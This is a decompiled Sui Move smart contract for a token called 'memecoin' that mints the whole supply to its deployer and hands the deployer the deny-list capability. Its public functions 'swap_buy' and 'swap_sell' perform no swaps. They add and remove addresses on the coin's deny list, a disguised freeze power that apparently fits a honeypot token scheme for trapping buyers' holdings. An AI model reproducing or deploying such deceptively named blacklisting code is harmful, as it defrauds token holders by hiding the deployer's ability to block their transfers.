module 0xf57b368e98b3e6eb6bc9a4fbb14f20d7de12d36dce654cfb0f9cc7db612583a1::memecoin {
    struct MEMECOIN has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: MEMECOIN, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<MEMECOIN>(arg0, 9, b"memecoin", b"i now identify as a memecoin", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmX5bUqtP18jCryNhGVouG1qieAgmmRvPw23NJJJ6ZZuUY"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<MEMECOIN>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<MEMECOIN>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<MEMECOIN>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<MEMECOIN>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MEMECOIN>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<MEMECOIN>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MEMECOIN>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<MEMECOIN>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

